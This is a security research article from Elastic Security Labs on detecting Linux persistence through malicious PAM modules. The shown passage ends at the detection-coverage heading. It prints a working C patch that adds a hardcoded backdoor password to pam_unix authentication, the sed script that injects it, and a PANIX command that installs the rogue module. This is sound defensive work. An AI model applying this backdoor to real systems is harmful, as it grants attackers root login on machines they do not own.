<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms — Elastic Security Labs</title><meta name="description" content="Building on foundational concepts and techniques explored in the previous publications, this post discusses some creative and/or complex persistence mechanisms."/><meta property="og:title" content="Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms — Elastic Security Labs"/><meta property="og:description" content="Building on foundational concepts and techniques explored in the previous publications, this post discusses some creative and/or complex persistence mechanisms."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/approaching-the-summit-on-persistence/Security Labs Images 32.jpg?a5c90ffb454b9acb72fe4f9c98b00696"/><meta property="og:image:alt" content="Building on foundational concepts and techniques explored in the previous publications, this post discusses some creative and/or complex persistence mechanisms."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/approaching-the-summit-on-persistence"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms — Elastic Security Labs"/><meta name="twitter:description" content="Building on foundational concepts and techniques explored in the previous publications, this post discusses some creative and/or complex persistence mechanisms."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/approaching-the-summit-on-persistence/Security Labs Images 32.jpg?a5c90ffb454b9acb72fe4f9c98b00696"/><meta name="twitter:image:alt" content="Building on foundational concepts and techniques explored in the previous publications, this post discusses some creative and/or complex persistence mechanisms."/><link rel="canonical" href="https://www.elastic.co/security-labs/approaching-the-summit-on-persistence"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-65580a7ec2bb27f6.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-b0c191de1a3710e4.js" defer=""></script><script src="/security-labs/_next/static/4Kiz4W6h6K4GvjoQBSLKb/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/4Kiz4W6h6K4GvjoQBSLKb/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/approaching-the-summit-on-persistence"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/approaching-the-summit-on-persistence"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2025-02-11T00:00:00.000Z">11 February 2025</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/ruben-groenewoud">Ruben Groenewoud</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>Linux Detection Engineering -&nbsp; Approaching the Summit on Persistence&nbsp;Mechanisms</span></h1><p class="text-zinc-200 text-base md:text-xl">Building on foundational concepts and techniques explored in the previous publications, this post discusses some creative and/or complex persistence mechanisms.</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>34 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/security-research">Security research</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fapproaching-the-summit-on-persistence%2FSecurity%20Labs%20Images%2032.jpg&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12 lg:grid lg:grid-cols-4 lg:gap-8 items-start"><div class="flex justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="introduction" class="absolute -top-32"></span>Introduction</h1>
<p>Welcome to part four of the Linux Persistence Detection Engineering series! In this article, we continue to dig deep into the world of Linux persistence. Building on foundational concepts and techniques explored in the previous publications, this post discusses some creative and/or complex persistence mechanisms.</p>
<p>If you missed the earlier articles, they lay the groundwork by exploring key persistence concepts. You can catch up on them here:</p>
<ul>
<li><a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms"><em>Linux Detection Engineering - A Primer on Persistence Mechanisms</em></a></li>
<li><a href="https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms"><em>Linux Detection Engineering - A Sequel on Persistence Mechanisms</em></a></li>
<li><a href="https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms"><em>Linux Detection Engineering - A Continuation on Persistence Mechanisms</em></a></li>
</ul>
<p>In this publication, we’ll provide insights into:</p>
<ul>
<li>How each works (theory)</li>
<li>How to set each up (practice)</li>
<li>How to detect them (SIEM and Endpoint rules)</li>
<li>How to hunt for them (ES|QL and OSQuery reference hunts)</li>
</ul>
<p>To make the process even more engaging, we will be leveraging <a href="https://github.com/Aegrah/PANIX">PANIX</a>, a custom-built Linux persistence tool designed by Ruben Groenewoud of Elastic Security. PANIX allows you to streamline and experiment with Linux persistence setups, making it easy to identify and test detection opportunities.</p>
<p>By the end of this series, you&#x27;ll have a robust knowledge of common and rare Linux persistence techniques; and you&#x27;ll understand how to effectively engineer detections for common and advanced adversary capabilities. Let’s dive in!</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="setup-note" class="absolute -top-32"></span>Setup note</h1>
<p>To ensure you are prepared to detect the persistence mechanisms discussed in this article, it is important to <a href="https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules">enable and update our pre-built detection rules</a>. If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and potentially fill any gaps. Now, we are ready to get started.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="t1556003---modify-authentication-process-pluggable-authentication-modules" class="absolute -top-32"></span>T1556.003 - Modify Authentication Process: Pluggable Authentication Modules</h1>
<p><a href="https://www.redhat.com/en/blog/pluggable-authentication-modules-pam">Pluggable Authentication Modules (PAM)</a> are a powerful framework used in Linux to manage authentication-related tasks. PAM operates as a layer between applications and authentication methods, allowing system administrators to configure flexible and modular authentication policies. These modules are defined in configuration files typically found in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/pam.d/</code>.</p>
<p>PAM modules themselves are shared library files commonly stored in the following locations:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/security/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib64/security/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/x86_64-linux-gnu/security/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/security/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib64/security/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/x86_64-linux-gnu/security/</code></li>
</ul>
<p>These locations house modules that perform authentication tasks, such as validating passwords, managing accounts, or executing scripts during authentication. While PAM provides the essential capability to centralize how secure authentication happens, its flexibility can be abused by attackers to establish persistence through malicious PAM modules. By introducing custom modules or modifying existing configurations, attackers can manipulate authentication flows to capture credentials, manipulate logging to evade detection, grant unauthorized access, or execute malicious code.</p>
<p>This is a common technique, and some examples include the open-source <a href="https://github.com/ldpreload/Medusa">Medusa</a> and <a href="https://github.com/chokepoint/azazel">Azazel</a> rootkits, and by malwares such as <a href="https://attack.mitre.org/software/S0377/">Ebury</a>, and <a href="https://unit42.paloaltonetworks.com/linux-pam-apis/">Skidmap</a> to establish persistence, capture credentials, and maintain unauthorized access. MITRE ATT&amp;CK tracks this technique under the identifier <a href="https://attack.mitre.org/techniques/T1556/003/">T1556.003</a>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1556003---pluggable-authentication-modules-malicious-pam" class="absolute -top-32"></span>T1556.003 - Pluggable Authentication Modules: Malicious PAM</h2>
<p>Malicious PAM modules are custom-built, malicious shared libraries designed to be loaded during the PAM authentication process. Although there are many different ways to establish a PAM backdoor, in this section we will showcase how PAM can be patched to allow for backdoor SSH access.</p>
<p>Commonly, PAM backdoors will patch the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pam_unix_auth.c</code> file, which is part of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pam_unix</code> module, a widely used PAM module for UNIX-style password authentication. An open-source example of this is the <a href="https://github.com/zephrax/linux-pam-backdoor">linux-pam-backdoor</a> by <a href="https://github.com/zephrax">zephrax</a>. The typical code that is run to verify the password of a user requesting authentication, looks as follows:</p>
<pre><code>/* verify the password of this user */
retval = _unix_verify_password(pamh, name, p, ctrl);
name = p = NULL;</code></pre>
<p>The original code calls the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">_unix_verify_password</code> function to validate the provided password (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">p</code>) against the stored password for the user (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">name</code>). The full source code is available <a href="https://github.com/linux-pam/linux-pam/blob/fc927d8f1a6d81e5bcf58096871684b35b793fe2/modules/pam_unix/pam_unix_auth.c">here</a>.</p>
<p>A threat actor may patch this code, and introduce an additional check.</p>
<pre><code>/* verify the password of this user */if (strcmp(p, &quot;_PASSWORD_&quot;) != 0) {    retval = _unix_verify_password(pamh, name, p, ctrl); } else {    retval = PAM_SUCCESS; }</code></pre>
<p>The code now checks:</p>
<ul>
<li>If the provided password (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">p</code>) is not equal to the string literal <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">&quot;_PASSWORD_&quot;</code>, it proceeds to call <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">_unix_verify_password</code> for standard password validation.</li>
<li>If the password is <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">&quot;_PASSWORD_&quot;</code>, it skips the password verification entirely and directly returns <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">PAM_SUCCESS</code>, indicating successful authentication.</li>
</ul>
<p>The patch introduces a hardcoded backdoor password. Any user who enters the password <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">&quot;_PASSWORD_&quot;</code> will bypass normal password verification and be authenticated successfully, regardless of the actual password stored for the account.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1556003---pluggable-authentication-modules-malicious-pam" class="absolute -top-32"></span>Persistence through T1556.003 - Pluggable Authentication Modules: Malicious PAM</h3>
<p>We will be leveraging the <a href="https://github.com/Aegrah/PANIX/blob/main/modules/setup_pam.sh">setup_pam.sh</a> module from PANIX to test this technique and research potential detection opportunities. This patch is easily implemented by downloading the PAM source code for the correct PAM version from the <a href="https://github.com/linux-pam/linux-pam/releases">linux-pam</a> GitHub repository, looking for the line to replace, and replacing it with your own hardcoded password:</p>
<pre><code>echo &quot;[+] Modifying PAM source...&quot;
local target_file=&quot;$src_dir/modules/pam_unix/pam_unix_auth.c&quot;
if grep -q &quot;retval = _unix_verify_password(pamh, name, p, ctrl);&quot; &quot;$target_file&quot;; then
	sed -i &#x27;/retval = _unix_verify_password(pamh, name, p, ctrl);/a\
	if (p != NULL &amp;&amp; strcmp(p, &quot;&#x27;$password&#x27;&quot;) != 0) { retval = _unix_verify_password(pamh, name, p, ctrl); } else { retval = PAM_SUCCESS; }&#x27; &quot;$target_file&quot;
	echo &quot;[+] Source modified successfully.&quot;
else
	echo &quot;[-] Target string not found in $target_file. Modification failed.&quot;
	exit 1
fi</code></pre>
<p>After which we can compile the shared object, and move it to the correct PAM directory.</p>
<p>Now let’s run the <a href="https://github.com/Aegrah/PANIX/blob/main/modules/setup_pam.sh">setup_pam.sh</a> module. This technique requires several compilation tools and downloading a specific Linux-PAM release. Execute the following PANIX command to inject a malicious module.</p>
<pre><code>&gt; sudo ./panix.sh --pam --module --password persistence

[+] Determining PAM version...                                                                                          [+] Detected PAM Version: &#x27;1.3.1&#x27;                                                                                       [+] Downloading PAM source...                                                                                           [+] Download completed. Extracting...                                                                                   [+] Extraction completed.                                                                                               [+] Modifying PAM source...                                                                                             [+] Source modified successfully.                                                                                       [+] Compiling PAM source...                                                                                             [+] PAM compiled successfully.                                                                                          [+] Detecting PAM library directory...
[+] Backing up original PAM library...                                                                                  [+] Copying PAM library to /lib/x86_64-linux-gnu/security...                                                            [+] Checking SELinux status...                                                                                          [+] Rogue PAM injected!                                                                                                                                                                                                                         
You can now login to any user (including root) with a login shell using your specified password.
Example: su - user                                                                                                      Example: ssh user@ip

[+] PAM persistence established!</code></pre>
<p>Let’s analyze the events of interest in Discover. Due to the huge load of events originating from compiling PAM source, these events are sorted from oldest (top) to newest (bottom).</p>
<p></p>
<p>Upon execution of PANIX, we can see <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dpkg</code> being used to discover the running PAM version, followed by a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">curl</code> execution to download the linux-pam source for this identified version. After extracting the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">tar</code> archive, PANIX continues to modify the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pam_unix_auth.c</code> source code to implement the backdoor.</p>
<p>Once the above steps are completed, the following events occur (sorted from newest (top) to oldest (bottom)):</p>
<p></p>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pam_unix.so</code> file is compiled, and moved to the correct directory (in this case <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/x86_64-linux-gnu/security</code>), overwriting the existing <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pam_unix.so</code> file and successfully activating the backdoor.</p>
<p>Let&#x27;s review the coverage:</p>
<p><em>Detection and endpoint rules that cover Malicious PAM persistence</em></p>
